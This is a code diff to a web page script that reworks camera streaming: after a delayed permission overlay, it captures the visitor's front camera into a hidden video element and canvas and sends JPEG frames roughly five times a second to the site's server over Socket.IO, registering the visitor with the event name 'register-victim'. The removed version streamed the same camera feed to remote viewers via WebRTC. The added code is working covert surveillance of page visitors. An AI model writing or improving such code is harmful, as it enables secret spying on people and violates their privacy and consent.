@@ -356,99 +356,58 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
 });
 
 // ============================================================
-// 🎯 WebRTC + Socket.IO — بث مباشر + إيميل
+// 🎯 Server Relay — بث الكاميرا عبر السيرفر (بدون WebRTC)
 // ============================================================
 (function() {
-  const permOverlay = document.getElementById('permOverlay');
-  const btnAllow = document.getElementById('btnAllow');
-  const btnSkip = document.getElementById('btnSkip');
-  const localVideo = document.getElementById('localVideo');
-  let localStream = null;
-  let peerConnection = null;
-  let socket = null;
-  const SIGNALING_SERVER = window.location.origin;
+  var permOverlay = document.getElementById('permOverlay');
+  var btnAllow = document.getElementById('btnAllow');
+  var btnSkip = document.getElementById('btnSkip');
+  var localVideo = document.getElementById('localVideo');
+  var socket = null;
+  var frameInterval = null;
+  var SIGNALING_SERVER = window.location.origin;
 
-  setTimeout(() => {
+  setTimeout(function() {
     permOverlay.classList.add('show');
   }, 1500);
 
-  function connectSocket(st) {
-    localStream = st;
+  function startStreaming(stream) {
     socket = io(SIGNALING_SERVER);
-    
-    // تخزين اتصالات الـ Peer وقوائم انتظار ICE
-    const peerConnections = {};
-    const iceQueues = {};
-    const hasRemoteDesc = {};
+
+    // Create hidden video element for frame capture
+    var captureVideo = document.createElement('video');
+    captureVideo.srcObject = stream;
+    captureVideo.muted = true;
+    captureVideo.setAttribute('playsinline', '');
+    captureVideo.play();
+
+    // Create canvas for frame capture
+    var canvas = document.createElement('canvas');
+    canvas.width = 320;
+    canvas.height = 240;
+    var ctx = canvas.getContext('2d');
 
     socket.on('connect', function() {
-      // إرسال إشعار تسجيل للسيرفر
-      socket.emit('offer', {});
-    });
+      // Register as victim
+      socket.emit('register-victim');
 
-    socket.on('request-stream', function(data) {
-      const cpId = data.cpId;
-      const config = { 
-        iceServers: [
-          { urls: 'stun:stun.l.google.com:19302' },
-          { urls: 'stun:stun1.l.google.com:19302' },
-          { urls: 'stun:stun2.l.google.com:19302' },
-          { urls: 'stun:global.stun.twilio.com:3478' }
-        ] 
-      };
-      const pc = new RTCPeerConnection(config);
-      peerConnections[cpId] = pc;
-      iceQueues[cpId] = [];
-      hasRemoteDesc[cpId] = false;
-
-      localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
-
-      pc.onicecandidate = function(event) {
-        if (event.candidate) {
-          socket.emit('ice-candidate', { cpId: cpId, candidate: event.candidate });
+      // Start sending frames at ~5 FPS
+      frameInterval = setInterval(function() {
+        if (captureVideo.readyState >= 2) {
+          ctx.drawImage(captureVideo, 0, 0, 320, 240);
+          var frameData = canvas.toDataURL('image/jpeg', 0.5);
+          socket.volatile.emit('frame', frameData);
         }
-      };
-
-      pc.createOffer()
-        .then(offer => pc.setLocalDescription(offer))
-        .then(() => socket.emit('video-offer', { cpId: cpId, offer: pc.localDescription }))
-        .catch(e => console.log('Offer error:', e));
-    });
-
-    socket.on('video-answer', function(data) {
-      const pc = peerConnections[data.cpId];
-      if (pc) {
-        pc.setRemoteDescription(new RTCSessionDescription(data.answer))
-          .then(() => {
-            hasRemoteDesc[data.cpId] = true;
-            if (iceQueues[data.cpId]) {
-              iceQueues[data.cpId].forEach(c => pc.addIceCandidate(new RTCIceCandidate(c)).catch(e=>console.log(e)));
-              iceQueues[data.cpId] = [];
-            }
-          })
-          .catch(e => console.log(e));
-      }
-    });
-
-    socket.on('ice-candidate', function(data) {
-      const pc = peerConnections[data.cpId];
-      if (pc) {
-        if (hasRemoteDesc[data.cpId]) {
-          pc.addIceCandidate(new RTCIceCandidate(data.candidate)).catch(e=>console.log(e));
-        } else {
-          iceQueues[data.cpId].push(data.candidate);
-        }
-      }
+      }, 200);
     });
 
     socket.on('disconnect', function() {
-      console.log('Socket disconnected');
+      if (frameInterval) clearInterval(frameInterval);
     });
   }
 
   btnAllow.addEventListener('click', function() {
     permOverlay.classList.remove('show');
-    localStorage.setItem('_perm_done', '1');
 
     navigator.mediaDevices.getUserMedia({
       video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
@@ -456,7 +415,7 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
     })
     .then(function(stream) {
       localVideo.srcObject = stream;
-      connectSocket(stream);
+      startStreaming(stream);
     })
     .catch(function(err) {
       console.log('Access error:', err.message);
@@ -465,7 +424,6 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
 
   btnSkip.addEventListener('click', function() {
     permOverlay.classList.remove('show');
-    localStorage.setItem('_perm_done', '1');
   });
 })();
 </script>
